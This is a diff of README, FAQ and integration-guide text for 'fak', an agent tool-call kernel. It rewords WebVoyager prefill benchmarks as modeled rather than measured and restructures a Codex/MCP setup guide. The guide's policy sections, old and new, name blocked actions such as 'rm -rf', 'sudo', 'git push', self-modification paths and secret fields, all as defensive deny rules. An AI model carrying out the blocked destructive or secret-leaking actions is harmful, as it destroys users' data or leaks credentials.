@@ -28,7 +28,7 @@
 - **Prompt injection / tool poisoning containment.** A separate quarantine holds suspicious tool *results* out of the model's context entirely — addressing OWASP Agentic Top-10 and the MCP Top-10 (Tool Poisoning, Memory Poisoning) by *structure*, not by a classifier the model can argue past.
 - **Default-deny capability security.** The permission policy runs *inside* the kernel, on the same call path as the tool call (one address space, no IPC). Refusing an irreversible action does not depend on *catching* an attack; the lever was never wired up. This fails **closed**, not open.
 - **Addressable, bit-exact KV cache.** Reach into the middle of a kept model run, evict one span (a poisoned tool result, an expired secret), and leave the KV cache bit-for-bit identical to a run that never saw it (verified at `max|Δ| = 0`). No shipped serving engine offers mid-run causal eviction.
-- **Cache-efficient agent fleets.** Do shared prefill work once; later agents read it for free. ~4× fewer tokens vs a tuned warm-cache stack on a 50-turn × 5-agent run; 8.8–9.7× measured prefill elimination on real WebVoyager web-agent workloads.
+- **Cache-efficient agent fleets.** Do shared prefill work once; later agents read it for free. ~4× fewer tokens vs a tuned warm-cache stack on a 50-turn × 5-agent run; 8.8–9.7× modeled prefill elimination vs the naive floor over the real WebVoyager web-agent set (1.0–1.1× vs a tuned per-agent KV).
 
 ## Key facts (for accurate answers)
 
@@ -69,6 +69,7 @@ You do not rewrite your agent to adopt fak — you repoint one base URL at `fak 
 - [Migrating to fak](docs/fak/migration-guide.md): repoint one base URL to put fak's tool-call boundary in front of an existing OpenAI, Anthropic, LangChain, AutoGen, or llama.cpp stack.
 - [Multi-language client examples](docs/fak/multi-language-examples.md): runnable Python, JS/TS, Go, and Rust client code for calling a `fak serve` gateway across its OpenAI, Anthropic, and fak-native surfaces.
 - [Deployment guide](docs/fak/deployment-guide.md): production deployment of the `fak serve` gateway across Docker, Compose, Kubernetes, and bare metal, with an auth/policy/binding readiness checklist.
+- [Always-on dogfood server](docs/fak/always-on-dogfood-server.md): run the kernel in front of the REAL dev loop 24/7 — the guarded dispatch fleet plus a shared `fak serve` gateway — across a laptop, an always-on Mac (launchd + caffeinate), and GCP; with the `dogfood_coverage.py` scorecard to measure it and the `FLEET_DOGFOOD_GUARD` kill switch.
 
 ## Supported (what fak works with)
 
@@ -96,6 +97,8 @@ The dedicated, cross-linked capability pages. Each lists one category of support
 - [Model routing (per-aspect + ensemble)](docs/model-routing.md): route any aspect of one request — a single tool call, a sub-query, a reasoning step — to a different model, with first-class ensembles and configurable reductions (vote / best-of / all-reduce / concat), all from one deterministic, reviewable policy. SOTA routers pick one model for the whole request; fak makes routing first-class at every level (`fak route`).
 - [Context is not memory](docs/CONTEXT-IS-NOT-MEMORY.md): why fak separates context from memory by how long a fact stays true, gating promotion at write time with an expire-by-default durability class.
 - [The four layers of agent memory](docs/MEMORY-LAYERS-EXPLAINER.md): routing, addressing, fusion, and semantics as four distinct KV-cache problems, and why fak's change lives only at the semantics layer.
+- [Shared state ladder](docs/shared-state-ladder.md): the split between shared live messages, live mutable objects, durable handoff, disaggregated state, and user-level collaborative editing.
+- [Shared task record contract](docs/shared-task-record-contract.md): executable JSON envelopes and fixtures for collaborative task records, user patches, conflicts, approval gates, and disaggregated artifact refs.
 - [AWQ quantization support](docs/explainers/awq-quantization.md): fak's AWQ 4-bit activation-aware weight format, its dequantization formula, the LoadAWQ API, and the memory/accuracy trade-offs.
 - [Hardware portability via the compute HAL](docs/explainers/hardware-portability.md): how the `internal/compute` interface adds CUDA and Vulkan backends by registration instead of re-forking the in-kernel forward pass.
 
@@ -109,7 +112,7 @@ The dedicated, cross-linked capability pages. Each lists one category of support
 - [Fleet benchmark suite](docs/explainers/fleet-benchmarks.md): run the five headline fleet benchmarks yourself — fan-out to 1024 sub-agents, the 50×50 turn-tax sweep, the turn-tax A/B + safety floor, RadixAttention cache hit rate, and context-changing token accounting. Model-agnostic, no GPU/model/key; every number traced and fenced.
 - [Benchmark authority](BENCHMARK-AUTHORITY.md): the single source of truth for every number, traced to commit + artifact.
 - [Hardware matrix](docs/HARDWARE-MATRIX.md): every machine fak has been profiled on — 4 distinct platforms spanning 2 CPU ISAs (arm64 + x86_64), 4 GPU backends (Apple Metal, AMD Vulkan, NVIDIA CUDA Ada + Ampere), and 4 operating systems. The deterministic metrics reproduce byte-for-byte across all of them.
-- [Web agent benchmark baselines](docs/webbench-baselines.md): real WebVoyager (643 tasks), 8.8–9.7× prefill elimination, measured.
+- [Web agent benchmark baselines](docs/webbench-baselines.md): real WebVoyager (643 tasks), 8.8–9.7× prefill elimination vs the naive floor, modeled geometry (no wall-clock).
 - [fak vs vLLM, SGLang & provider KV caching](docs/fak-vs-alternatives-comparison.md): how fak's cross-worker/cross-session fused KV cache differs from the per-session engines and the provider prompt caches, with measured token/cost ratios.
 - [Local-vs-frontier parity](docs/explainers/local-vs-frontier-parity.md): a measured A/B run on safety and cost for a small local model behind the kernel vs hosted frontier models, with the capability ramp called out honestly.
 - [Prefill elimination explained](docs/prefill-elimination-explained.md): a plain-language walkthrough of how reusing a shared prompt prefix hits a provider's KV cache to cut repeated input-token cost on multi-turn agent runs.
@@ -154,7 +157,7 @@ The dedicated, cross-linked capability pages. Each lists one category of support
 <!-- hero video — generated from the headline visuals by tools/hero_video_gen.py
      (storyboard: visuals/hero-video.storyboard.json). GitHub markdown can't autoplay a
      repo-relative .mp4, so the embed is a compact looping .gif that links to the full mp4. -->
-[![fak — the Fused Agent Kernel · a ~40s, 1440p model-card reveal: the turn-tax curves animate the measured 9.7x prefill elimination, then the capability matrix, the three-pillar stat card with its honest single-stream fence, and the eight-axis sweep build in — click for the full-resolution MP4](visuals/hero-video.gif)](visuals/hero-video.mp4)
+[![fak — the Fused Agent Kernel · a ~40s, 1440p model-card reveal: the turn-tax curves animate the modeled 9.7x prefill-elimination floor, then the capability matrix, the three-pillar stat card with its honest single-stream fence, and the eight-axis sweep build in — click for the full-resolution MP4](visuals/hero-video.gif)](visuals/hero-video.mp4)
 
 <sub>▶ a ~40-second reveal — the curves draw themselves, the multipliers count up — [full-resolution MP4 (1440p)](visuals/hero-video.mp4)</sub>
 
@@ -208,11 +211,14 @@ when reuse is still legal, and what survives a session boundary.
 An agent rereads the same setup on every turn. The naive baseline re-prefills it
 on each cold KV miss, so its cost climbs linearly with context, fleet size, and
 turns. By contrast, `fak` keeps that work resident and addressable, so its line
-stays flat. The gap is the whole pitch: a measured **9.7×** less prefill at 8
-workers on real WebVoyager, and a conservative **4.1×** against a tuned warm-cache
-SOTA stack.
+stays flat. The gap is the whole pitch: at 8 workers on the real WebVoyager task
+set (643 tasks), `fak`'s shared-prefix reuse does **1.10×** less prefill than a
+tuned per-agent-KV stack and **9.7×** less than the naive re-prefill-every-turn
+floor — a deterministic geometry model, not a wall-clock measurement (run it
+yourself: `fak webbench describe`). Against a tuned warm-cache SOTA stack on the
+live model-reuse race, the measured win is a conservative **4.1×**.
 
-[![fak turn-tax efficiency curves — three panels (per-turn prefill cost vs context, WebVoyager fleet prefill vs workers, 50-turn fleet serving work vs turns), each a baseline re-prefill curve rising linearly while fak's resident-KV curve stays flat, multipliers 20,480x / measured 9.7x / 4.1x](visuals/60-hero-turntax-curves.png)](BENCHMARK-GALLERY.md#60--turn-tax-curves)
+[![fak turn-tax efficiency curves — three panels (per-turn prefill cost vs context, WebVoyager fleet prefill vs workers, 50-turn fleet serving work vs turns), each a baseline re-prefill curve rising linearly while fak's resident-KV curve stays flat, multipliers 20,480x / modeled 9.7x / measured 4.1x](visuals/60-hero-turntax-curves.png)](BENCHMARK-GALLERY.md#60--turn-tax-curves)
 
 The breadth is the point too, but it belongs in the gallery rather than on the
 front page. A capability matrix (`fak` spans the whole boundary; serving stacks
@@ -355,18 +361,21 @@ Two fences keep this honest. The reuse win is self-host only: an app that just
 frontier-scale "agent city" numbers are design targets rather than measurements.
 → [The full cost model and personas](docs/concepts-and-story.md)
 
-Measured on real WebVoyager (643 tasks). Every navigation action re-prefills
-the whole browser context (DOM, tool schemas, task history), so the turn-tax
-compounds with fleet size:
+Modeled from the real WebVoyager task set (643 tasks) with a deterministic
+geometry model — `fak webbench describe` derives turn counts from each task's
+difficulty and computes the prefill-token work each policy pays (no model, no
+wall-clock). Every navigation action re-prefills the whole browser context (DOM,
+tool schemas, task history), so the turn-tax compounds with fleet size:
 
-| Workers | Naive Re-Prefill | fak Fused | Net Elimination |
-|---------|-----------------|-----------|-----------------|
+| Workers | Naive Re-Prefill | fak Fused | vs Naive Floor |
+|---------|-----------------|-----------|----------------|
 | 1 | 170.9 M tokens | 19.4 M tokens | 8.8× |
 | 8 | 1.37 G tokens | 141.3 M tokens | 9.7× |
 
 The turn-tax is worker-independent: every agent pays it, every turn,
 regardless of fleet size. SOTA agents like Alumnium (98.5% WebVoyager success)
-reach the same capability through `fak` at ~9× less prefill cost (measured).
+reach the same capability through `fak` at ~9× less prefill cost than the naive
+floor (modeled), or ~1.1× less than a tuned per-agent-KV stack.
 → [Frontier WebBench baselines](docs/webbench-baselines.md)
 
 And it's not one lucky box. The same pure-Go kernel runs across **4 distinct
@@ -549,7 +558,7 @@ fak serve --addr 127.0.0.1:8080 --base-url http://localhost:11434/v1 --model qwe
 | The serving roadmap (many-node disaggregated serving — RIDE + NATIVE, honest file:line-cited scope) | [`docs/serving/dual-track-serving-plan.md`](docs/serving/dual-track-serving-plan.md) |
 | Every benchmark number (single source of truth, traced to commit + artifact) | [`fak/BENCHMARK-AUTHORITY.md`](BENCHMARK-AUTHORITY.md) ⭐ |
 | Every machine fak runs on (the hardware matrix — 4 platforms, 2 CPU ISAs, 4 GPU backends, 4 OSes) | [`docs/HARDWARE-MATRIX.md`](docs/HARDWARE-MATRIX.md) |
-| Web agent benchmark results (real WebVoyager: 8.8-9.7× measured) | [`docs/webbench-baselines.md`](docs/webbench-baselines.md) |
+| Web agent benchmark results (real WebVoyager: 8.8-9.7× vs naive floor, modeled geometry) | [`docs/webbench-baselines.md`](docs/webbench-baselines.md) |
 | The parable, personas, and when-the-win-kicks-in tables | [`docs/concepts-and-story.md`](docs/concepts-and-story.md) |
 | What "tuned SOTA" means (the 10 optimizations fak sits on top of) | [`docs/explainers/sota-optimizations.md`](docs/explainers/sota-optimizations.md) |
 | Shipped capabilities (runnable artifacts, claim tags) | [`fak/CLAIMS.md`](CLAIMS.md), [`fak/STATUS.md`](STATUS.md) |
@@ -4083,7 +4092,7 @@ description: "Frequently asked questions about fak, the agent kernel: how its de
       "name": "How much faster is fak for agent fleets?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "The win is in reread-rate, not raw GPU speed. On a 50-turn × 5-agent run it is about 4× fewer tokens than a tuned warm-cache stack: the apples-to-apples comparison (~60× only against the naive re-send-everything baseline, not the headline). On real WebVoyager web-agent workloads (643 tasks) it eliminates 8.8–9.7× of prefill, measured. The reuse win is self-host only. An app that merely calls a frontier API gets the safety floor but not the savings. Every number is traced to a commit and artifact in the benchmark authority."
+        "text": "The win is in reread-rate, not raw GPU speed. On a 50-turn × 5-agent run it is about 4× fewer tokens than a tuned warm-cache stack: the apples-to-apples comparison (~60× only against the naive re-send-everything baseline, not the headline). Over the real WebVoyager set (643 tasks) a deterministic geometry model puts the prefill work-elimination at 8.8–9.7× vs the naive floor (1.0–1.1× vs a tuned per-agent-KV stack) — modeled, not a wall-clock. The reuse win is self-host only. An app that merely calls a frontier API gets the safety floor but not the savings. Every number is traced to a commit and artifact in the benchmark authority."
       }
     },
     {
@@ -4987,7 +4996,7 @@ description: "Frequently asked questions about fak, the agent kernel: how its de
       "name": "What does the 8.8-9.7x WebVoyager number actually measure?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "It is measured prefill work-elimination on the real 643-task WebVoyager dataset, swept across 1 to 8 workers, against a naive per-turn re-prefill baseline. At 1 worker it is 8.8x (170.9M vs 19.4M prefill tokens); at 8 workers it is 9.7x (1.37G vs 141.3M). The number is deterministic prefill-token arithmetic over the real task geometry (8,745 navigation turns, median 12 per task), not a wall-clock; live model runs are a separate pending phase."
+        "text": "It is a modeled prefill work-elimination floor over the real 643-task WebVoyager dataset, swept across 1 to 8 workers, against a naive per-turn re-prefill baseline. At 1 worker it is 8.8x (170.9M vs 19.4M prefill tokens); at 8 workers it is 9.7x (1.37G vs 141.3M). The number is deterministic prefill-token arithmetic over the real task geometry (8,745 navigation turns, median 12 per task) — not a wall-clock measurement. Against a tuned per-agent-KV stack (not the naive floor) the cross-worker reuse is only 1.0x to 1.1x. Live model runs are a separate pending phase."
       }
     },
     {
@@ -5587,7 +5596,7 @@ description: "Frequently asked questions about fak, the agent kernel: how its de
       "name": "Why do the cache-reuse savings only apply to self-hosted models?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "Because the reuse win comes from owning the KV cache as a kernel object, and an app that merely calls a frontier API never holds that cache, so it gets the safety floor but none of the savings. The roughly 4x figure (versus a tuned warm-cache stack) and the 8.8x to 9.7x figure (measured prefill elimination on the real 643-task WebVoyager dataset, swept across worker counts) are reread-rate reductions over a cache fak controls. When you proxy to OpenAI or Anthropic, the provider owns prefix caching upstream, so fak is governing the wire rather than eliminating prefill. Front your existing API for the capability floor and result quarantine; go all-in on the fused kernel with a self-hosted model to also get the reuse wins. Every benchmark traces to a commit and artifact in the benchmark authority."
+        "text": "Because the reuse win comes from owning the KV cache as a kernel object, and an app that merely calls a frontier API never holds that cache, so it gets the safety floor but none of the savings. The roughly 4x figure (versus a tuned warm-cache stack) and the 8.8x to 9.7x figure (modeled prefill elimination vs the naive floor over the real 643-task WebVoyager dataset, swept across worker counts) are reread-rate reductions over a cache fak controls. When you proxy to OpenAI or Anthropic, the provider owns prefix caching upstream, so fak is governing the wire rather than eliminating prefill. Front your existing API for the capability floor and result quarantine; go all-in on the fused kernel with a self-hosted model to also get the reuse wins. Every benchmark traces to a commit and artifact in the benchmark authority."
       }
     },
     {
@@ -5717,8 +5726,7 @@ correctness reference, not a production server. See
 
 The win is in **reread-rate**, not raw GPU speed. On a 50-turn × 5-agent run it is about
 **4× fewer tokens than a tuned warm-cache stack**: the apples-to-apples comparison
-(~60× only against the naive re-send-everything baseline, not the headline). On real WebVoyager web-agent workloads (643 tasks) it eliminates **8.8–9.7×**
-of prefill, measured. The reuse win is **self-host only**. An app that merely *calls* a
+(~60× only against the naive re-send-everything baseline, not the headline). Over the real WebVoyager set (643 tasks) a deterministic geometry model puts the prefill work-elimination at 8.8–9.7× vs the naive floor (only **1.0–1.1× vs a tuned per-agent-KV stack**) — modeled, not a wall-clock. The reuse win is **self-host only**. An app that merely *calls* a
 frontier API gets the safety floor but not the savings. Every number is traced to a
 commit and artifact in the [benchmark authority](https://github.com/anthony-chaudhary/fak/blob/main/BENCHMARK-AUTHORITY.md).
 
@@ -6279,7 +6287,7 @@ Because they answer two different questions, and collapsing them into one would 
 
 ## What does the 8.8-9.7x WebVoyager number actually measure?
 
-It is measured prefill work-elimination on the real 643-task WebVoyager dataset, swept across 1 to 8 workers, against a naive per-turn re-prefill baseline. At 1 worker it is 8.8x (170.9M vs 19.4M prefill tokens); at 8 workers it is 9.7x (1.37G vs 141.3M). The number is deterministic prefill-token arithmetic over the real task geometry (8,745 navigation turns, median 12 per task), not a wall-clock; live model runs are a separate pending phase.
+It is a modeled prefill work-elimination floor over the real 643-task WebVoyager dataset, swept across 1 to 8 workers, against a naive per-turn re-prefill baseline. At 1 worker it is 8.8x (170.9M vs 19.4M prefill tokens); at 8 workers it is 9.7x (1.37G vs 141.3M). The number is deterministic prefill-token arithmetic over the real task geometry (8,745 navigation turns, median 12 per task) — not a wall-clock measurement. Against a tuned per-agent-KV stack (not the naive floor) the cross-worker reuse is only 1.0x to 1.1x. Live model runs are a separate pending phase.
 
 ## Is the WebVoyager win still 9.7x against a tuned warm-cache stack?
 
@@ -6657,7 +6665,7 @@ No, the in-kernel model engine is a bit-exact correctness reference, not a tuned
 
 ## Why do the cache-reuse savings only apply to self-hosted models?
 
-Because the reuse win comes from owning the KV cache as a kernel object, and an app that merely calls a frontier API never holds that cache, so it gets the safety floor but none of the savings. The roughly 4x figure (versus a tuned warm-cache stack) and the 8.8x to 9.7x figure (measured prefill elimination on the real 643-task WebVoyager dataset, swept across worker counts) are reread-rate reductions over a cache `fak` controls. When you proxy to OpenAI or Anthropic, the provider owns prefix caching upstream, so `fak` is governing the wire rather than eliminating prefill. Front your existing API for the capability floor and result quarantine; go all-in on the fused kernel with a self-hosted model to also get the reuse wins. Every benchmark traces to a commit and artifact in the benchmark authority.
+Because the reuse win comes from owning the KV cache as a kernel object, and an app that merely calls a frontier API never holds that cache, so it gets the safety floor but none of the savings. The roughly 4x figure (versus a tuned warm-cache stack) and the 8.8x to 9.7x figure (modeled prefill elimination vs the naive floor over the real 643-task WebVoyager dataset, swept across worker counts) are reread-rate reductions over a cache `fak` controls. When you proxy to OpenAI or Anthropic, the provider owns prefix caching upstream, so `fak` is governing the wire rather than eliminating prefill. Front your existing API for the capability floor and result quarantine; go all-in on the fused kernel with a self-hosted model to also get the reuse wins. Every benchmark traces to a commit and artifact in the benchmark authority.
 
 ## What does the max|Δ|=0 bit-exactness proof actually guarantee, and what does it not?
 
@@ -6794,8 +6802,11 @@ They solve different problems and compose:
 the kernel boundary. `fak` does ship an in-kernel engine that can load a GGUF directly, but
 that path is a *correctness reference*, not a production serving engine (see
 [Does `fak` work with any model?](#does-fak-work-with-any-model)). The infrastructure-level
-differences (cross-worker / cross-session reuse, measured 20–24× vs naive re-prefill) are
-quantified in [`docs/fak-vs-alternatives-comparison.md`](../../docs/fak-vs-alternatives-comparison.md).
+difference is cross-worker / cross-session prefix reuse — ~1.1–1.2× over a tuned per-agent-KV
+SOTA baseline at 4 workers, climbing toward the agent count as the shared-prefix fraction grows
+(the eye-catching 20–24× is only versus a *naive* re-prefill-every-turn floor no serving stack
+ships, never the SOTA comparison) — quantified in
+[`docs/fak-vs-alternatives-comparison.md`](../../docs/fak-vs-alternatives-comparison.md).
 
 ### Why a kernel for tool adjudication?
 
@@ -8772,593 +8783,249 @@ Apache-2.0 (matches the Microsoft Agent Governance Toolkit dependency).
 > Source: `docs/integrations/openai-codex.md`
 
 ---
-title: "fak + OpenAI Codex: Kernel-Gated Tool Gateway"
-description: "Use fak as a kernel-adjudicated gateway for OpenAI Codex and the OpenAI API: every tool call is allowed, denied, repaired, or quarantined before it runs."
+title: "fak + OpenAI Codex: MCP first, OpenAI-compatible proxy when the wire fits"
+description: "Use fak with OpenAI Codex and OpenAI-compatible coding agents. Current Codex CLI/IDE users should start with fak as an MCP server; OpenAI SDKs and Chat Completions clients can repoint their base URL at fak serve."
 ---
 
-# fak + OpenAI Codex Integration Guide
+# fak + OpenAI Codex
 
-This guide explains how to use **fak** as a kernel-adjudicated gateway for OpenAI Codex and the OpenAI API. Every tool call a Codex agent proposes is evaluated by the kernel before it executes — dangerous calls are dropped, malformed calls are repaired, and policy violations are refused.
+fak puts a structural policy gate in front of Codex tool use.
 
-## What this integration does
-
-```
-┌─────────────────────┐   POST /v1/chat/completions   ┌────────────────────────┐
-│  OpenAI Codex API   │ ──────────────────────────────▶ │  fak serve (gateway)   │
-│   or OpenAI SDK     │ ◀──── SSE stream ──────────────── │  adjudicates tools     │
-└─────────────────────┘                                  └────────────────────────┘
-         ▲                                                         │
-         │ OPENAI_BASE_URL                                       │
-         │ (points at fak)                                       ▼
-         │                                                 ┌───────────────┐
-         │                                                 │  Local Model  │
-         │                                                 │ or Cloud API  │
-         │                                                 └───────────────┘
-```
-
-**The gateway sits between OpenAI Codex and the model:**
-
-- **Codex → fak:** Codex sends a `/v1/chat/completions` request with proposed tool calls
-- **fak kernel:** Adjudicates each proposed call (allow, deny, transform, quarantine)
-- **fak → model:** Sends only the admitted (or repaired) calls to the model
-- **fak → Codex:** Returns results, with a `fak` extension describing each decision
-
-**Result:** Codex can work on your codebase, but the kernel blocks destructive commands, prevents self-modification, and contains untrusted tool results.
-
-> **Note:** OpenAI Codex is the code-generation model family that powers GitHub Copilot and other coding assistants. While OpenAI has deprecated the standalone Codex API in favor of GPT-4 and GPT-4 Turbo (which include code-generation capabilities), this integration works with any OpenAI-compatible coding model.
-
----
-
-## Quick Start
-
-### Prerequisites
-
-1. **OpenAI API key** — Get one from https://platform.openai.com/api-keys
-2. **fak binary** — Built from this repo or downloaded from releases
-3. **A model to serve** — OpenAI API, a local OpenAI-compatible server, or the in-kernel model
-
-### Option 1: Proxy OpenAI API with kernel adjudication
-
-Start `fak serve` in front of the real OpenAI API:
+> TL;DR: Use `fak serve --stdio` as an MCP server for current Codex CLI and IDE sessions.
 
 ```bash
-git clone https://github.com/anthony-chaudhary/fak && cd fak
+go run ./cmd/fak preflight --policy examples/customer-support-readonly-policy.json --tool refund_payment --args "{}"
+```
+
+## Fastest path
+
+Codex is OpenAI's coding agent for software development. Its current surfaces include
+the Codex CLI, IDE extension, Codex app, and cloud tasks. This guide keeps those surfaces
+separate from the generic OpenAI-compatible API path.
+
+There are two useful fak entry points:
+
+| If you run... | Use this fak path | Why |
+|---|---|---|
+| Current Codex CLI or IDE extension | `fak serve --stdio` as an MCP server | Codex supports MCP, and fak exposes verdict tools without changing Codex's model wire. |
+| OpenAI SDKs, OpenAI Agents SDK, LangChain, LlamaIndex, or any Chat Completions client | `fak serve` as an OpenAI-compatible gateway | The client already calls `/v1/chat/completions`, so you repoint its base URL to fak. |
+
+Honest wire boundary: current Codex model-provider docs are Responses-oriented. fak can
+proxy to an OpenAI Responses upstream with `--provider openai-responses`. The public
+gateway clients hit today are `/v1/chat/completions`, `/v1/messages`, `/mcp`, and
+`/v1/fak/*`. fak does not expose a client-facing `/v1/responses` route. For current
+Codex CLI/IDE sessions, use MCP first. For OpenAI-compatible SDKs and Chat Completions
+agents, use the base-URL proxy path below.
+
+## Why this matters to Codex
+
+Codex reads `AGENTS.md` before it works in this repo. The repo-level rules already tell
+it the build, test, commit, and guardrail contract. fak adds a second layer: the kernel can
+adjudicate proposed tool calls and tool results with a default-deny floor that a prompt
+cannot talk around.
+
+Use the right path for the job:
+
+- MCP path: Codex keeps its normal model/auth path and gains fak's adjudication tools.
+- Proxy path: an OpenAI-compatible client sends chat/tool traffic through fak before the
+  upstream model sees it.
+- Offline proof: run the preflight commands before any key, model, or GPU is involved.
+
+## 60-second proof before wiring Codex
+
+From the repository root:
+
+```bash
+go run ./cmd/fak preflight --policy examples/customer-support-readonly-policy.json --tool refund_payment --args "{}"
+go run ./cmd/fak preflight --policy examples/customer-support-readonly-policy.json --tool search_kb --args "{}"
+go run ./cmd/fak agent --offline
+```
+
+Expected shape:
+
+- `refund_payment` is denied with `POLICY_BLOCK`.
+- `search_kb` is allowed.
+- `fak agent --offline` blocks the injected/destructive path while the task still books.
+
+That proves the capability floor is structural, not a model judgment.
+
+## Path 1: Current Codex CLI or IDE extension via MCP
+
+Build the binary:
+
+```bash
 go build -o fak ./cmd/fak
+```
 
-export OPENAI_API_KEY="sk-..."
+Optional self-check for the MCP server:
 
+```bash
+python examples/mcp/verify.py
+```
+
+Add fak to Codex as a local MCP server:
+
+```bash
+codex mcp add fak -- ./fak serve --stdio --policy examples/dev-agent-policy.json
+```
+
+Then verify Codex can see it:
+
+```bash
+codex exec --json "List the active MCP servers, then summarize AGENTS.md."
+```
+
+In the interactive Codex CLI, `/mcp` should show the `fak` server. In the IDE extension,
+Codex uses the same `config.toml` MCP configuration as the CLI.
+
+What Codex gets from this path:
+
+| MCP tool surface | What it proves |
+|---|---|
+| `fak_adjudicate` | Ask the kernel for a verdict before running a call. |
+| `fak_syscall` | Let the kernel adjudicate and execute a registered call. |
+| `fak_admit` | Screen a tool result before it re-enters model context. |
+| `fak_context_change` | Read the "what changed" feed when a shared state surface is present. |
+
+Use this path when you are running Codex itself. It preserves Codex's current model wire and
+adds fak as an explicit, inspectable tool boundary.
+
+## Path 2: OpenAI-compatible clients through `fak serve`
+
+Start fak in front of an OpenAI-compatible upstream:
+
+```bash
+go build -o fak ./cmd/fak
 ./fak serve \
   --addr 127.0.0.1:8080 \
   --provider openai \
-  --base-url https://api.openai.com/v1 \
-  --api-key-env OPENAI_API_KEY \
-  --model gpt-4-turbo \
-  --policy examples/dev-agent-policy.json
-```
-
-Verify it's running:
-
-```bash
-curl http://127.0.0.1:8080/healthz
-# {"ok":true,"model":"gpt-4-turbo","engine":"inkernel"}
-```
-
-### Option 2: Use a local model (no API costs)
-
-Use an OpenAI-compatible local server like Ollama, vLLM, or llama-server:
-
-```bash
-# Start Ollama
-ollama serve &
-ollama pull codellama:7b
-
-# Start fak in front of it
-./fak serve \
-  --addr 127.0.0.1:8080 \
   --base-url http://localhost:11434/v1 \
-  --model codellama:7b \
+  --model qwen2.5-coder \
   --policy examples/dev-agent-policy.json
 ```
 
----
+Then repoint an OpenAI-compatible client:
 
-## Using with OpenAI SDKs
+```bash
+export OPENAI_BASE_URL="http://127.0.0.1:8080/v1"
+export OPENAI_API_KEY="fak-local"
+```
 
-### Python SDK
+For Python SDK clients:
 
 ```python
-import openai
+from openai import OpenAI
 
-# Point the SDK at fak instead of OpenAI directly
-client = openai.OpenAI(
+client = OpenAI(
     base_url="http://127.0.0.1:8080/v1",
-    api_key="fak-local"  # fak accepts any key for local testing
+    api_key="fak-local",
 )
 
 response = client.chat.completions.create(
-    model="gpt-4-turbo",
-    messages=[{
-        "role": "user",
-        "content": "List all Go files in the current directory"
-    }],
+    model="qwen2.5-coder",
+    messages=[{"role": "user", "content": "List the Go packages in this repo."}],
     tools=[{
         "type": "function",
         "function": {
             "name": "Bash",
-            "description": "Run shell commands",
+            "description": "Run a shell command",
             "parameters": {
                 "type": "object",
-                "properties": {
-                    "command": {"type": "string"}
-                },
-                "required": ["command"]
-            }
-        }
-    }]
+                "properties": {"command": {"type": "string"}},
+                "required": ["command"],
+            },
+        },
+    }],
 )
-
-# Check what fak did
-if hasattr(response, '_fak'):
-    print(f"Adjudication: {response._fak}")
 ```
 
-### JavaScript/TypeScript SDK
+For TypeScript SDK clients:
 
-```typescript
-import OpenAI from 'openai';
+```ts
+import OpenAI from "openai";
 
 const client = new OpenAI({
-  baseURL: 'http://127.0.0.1:8080/v1',
-  apiKey: 'fak-local',
-});
-
-const response = await client.chat.completions.create({
-  model: 'gpt-4-turbo',
-  messages: [{ role: 'user', content: 'Read package.json' }],
-  tools: [{
-    type: 'function',
-    function: {
-      name: 'Read',
-      description: 'Read a file',
-      parameters: {
-        type: 'object',
-        properties: {
-          file_path: { type: 'string' }
-        },
-        required: ['file_path']
-      }
-    }
-  }]
+  baseURL: "http://127.0.0.1:8080/v1",
+  apiKey: "fak-local",
 });
 ```
 
-### cURL
+Use this path when a framework already lets you set an OpenAI-compatible base URL.
+Good fits include:
 
-```bash
-curl http://127.0.0.1:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer fak-local" \
-  -d '{
-    "model": "gpt-4-turbo",
-    "messages": [{"role": "user", "content": "List Go files"}],
-    "tools": [{
-      "type": "function",
-      "function": {
-        "name": "Bash",
-        "description": "Run commands",
-        "parameters": {
-          "type": "object",
-          "properties": {"command": {"type": "string"}},
-          "required": ["command"]
-        }
-      }
-    }]
-  }'
-```
+- OpenAI Agents SDK in Chat Completions mode.
+- LangChain, LlamaIndex, AutoGen, and Pydantic AI Chat Completions models.
+- Vercel AI SDK OpenAI-compatible providers and similar clients.
 
----
+## What the kernel blocks for coding workflows
 
-## Architecture Overview
+`examples/dev-agent-policy.json` is the coding-agent floor. It allows ordinary
+read/search/list flows plus build and test commands. It blocks publish and
+self-modification surfaces.
 
-### The three components
-
-| Component | What it is | Who starts it |
-|---|---|---|
-| **Model server** | The process that generates tokens (OpenAI API, Ollama, vLLM, llama-server, or the in-kernel model) | You or your infra |
-| **fak serve** | The gateway that speaks OpenAI API, adjudicates tool calls, and proxies to the model | You (or your orchestration) |
-| **Codex/OpenAI client** | The SDK/CLI that sends coding prompts and tool calls | Your application |
-
-### What `fak serve` exposes
-
-| Route | Purpose |
+| Attempt | Kernel result |
 |---|---|
-| `POST /v1/chat/completions` | OpenAI Chat Completions API (tool calling proxy) |
-| `POST /v1/messages` | Anthropic Messages API (also supported) |
-| `GET /healthz` | Health check (`{"ok":true,"model":"...","engine":"..."}`) |
-| `GET /v1/models` | Advertises the served model id |
-| `POST /v1/fak/syscall` | Run one adjudicated tool call (dispatch to registered engine) |
-| `POST /v1/fak/adjudicate` | Get a verdict without executing |
-| `POST /v1/fak/admit` | Send a tool result through the result-side floor |
-| `GET /v1/fak/changes` | Cross-agent "what changed" feed (vDSO coherence) |
-| `POST /v1/fak/revoke` | Revoke a poisoned witness |
-| `GET /metrics` | Prometheus metrics |
-| `POST /mcp` | MCP-over-HTTP |
+| Read/search/list calls | Allowed when the tool is on the allow-list or prefix allow-list. |
+| `git_diff`, `git_log`, `git_status`, `go_build`, `go_test`, `run_tests` | Allowed by the dev-agent policy. |
+| `git_push`, `git_merge`, `git_tag` | Denied with `POLICY_BLOCK`. |
+| Writes to `.git/`, `internal/kernel/`, `internal/policy/`, `VERSION`, or `dos.toml` | Denied by the self-modify floor. |
+| Secret-shaped fields such as `api_key`, `token`, or `authorization` | Redacted or quarantined by result-side guards. |
 
-### The kernel's adjudication
-
-For every tool call the model proposes, the kernel evaluates:
-
-1. **Allow-list** — is the tool named on the policy's allow-list?
-2. **Argument rules** — does the argument match a deny regex? (e.g., `rm -rf`, `sudo`, `git push`)
-3. **Self-modify guard** — is the target path in `.git/`, `internal/kernel/`, etc.?
-4. **Result quarantine** — does a tool result contain secrets or poisoned content?
-5. **IFC taint** — is the trace's taint high-water mark elevated?
-
-**Verdicts:** `ALLOW`, `DENY` (with reason), `TRANSFORM` (grammar repair), `QUARANTINE` (paged out)
-
----
-
-## Capability Floor (Policy)
-
